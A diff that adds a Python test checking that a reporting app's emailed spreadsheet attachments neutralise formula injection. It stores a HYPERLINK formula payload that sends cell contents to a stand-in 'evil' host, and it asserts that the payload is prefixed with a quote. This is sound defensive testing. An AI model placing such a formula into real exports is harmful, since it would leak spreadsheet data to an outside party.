@@ -871,3 +871,14 @@ class TestChecks:
     def test_empty_and_full_base_urls_pass(self):
         assert self.ids(REPORTS_BASE_URL="") == []
         assert self.ids(REPORTS_BASE_URL="https://panel.example.com") == []
+
+
+class TestAttachmentFormulaInjection:
+    def test_a_formula_in_the_data_is_quoted_in_the_attachment(self, ada, mailoutbox):
+        evil = '=HYPERLINK("http://evil/?"&A1,"x")'
+        Author.objects.create(name=evil, email="e@example.com")
+        view = make_view(ada, state={"version": 1, "filters": {}, "q": "HYPERLINK"})
+        run_now(make_sub(ada, view))
+        _, rows = attached_rows(mailoutbox[0])
+        assert "'" + evil in [cell for row in rows for cell in row]
+        assert evil not in [cell for row in rows for cell in row]
